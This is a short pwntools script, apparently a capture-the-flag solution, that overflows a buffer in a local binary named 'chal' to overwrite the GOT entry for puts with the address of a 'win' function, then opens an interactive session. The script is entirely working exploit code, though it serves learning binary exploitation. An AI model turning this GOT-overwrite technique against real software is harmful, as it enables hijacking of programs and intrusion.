from pwn import *
elf = context.binary = ELF("chal")
p = remote("localhost", 8000)# process()
p.sendline(b"A"*96 + p32(elf.got["puts"]))
p.sendline(str(elf.sym["win"]).encode())
p.interactive()